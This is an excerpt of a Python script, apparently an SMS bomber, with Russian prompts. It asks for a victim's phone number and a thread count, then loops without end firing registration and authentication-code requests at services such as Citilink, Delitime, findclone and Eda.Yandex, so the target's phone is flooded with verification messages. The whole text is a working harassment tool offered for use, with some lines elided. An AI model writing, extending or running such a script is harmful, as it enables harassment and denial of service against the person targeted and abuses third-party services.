...
print("powered by rootWin")

phone = input('Напишите номер жетвы:')
countT = input('Введите потоки:')
...
def infinity():
	while True:
		...
		try:
			...
			print('[+] carsmile Успех!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
			print('[+] Citilink Успех!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
			print('[+] Delitime Успех!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
			print('[+] findclone Успех!')
		except:
			print('[-] Не отправлено!')
		...
		try:
			...
			print('[+] wowworks Успех!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
			print('[+] Eda.Yandex Успех!')
		except:
			print('[-] Не отправлено!')
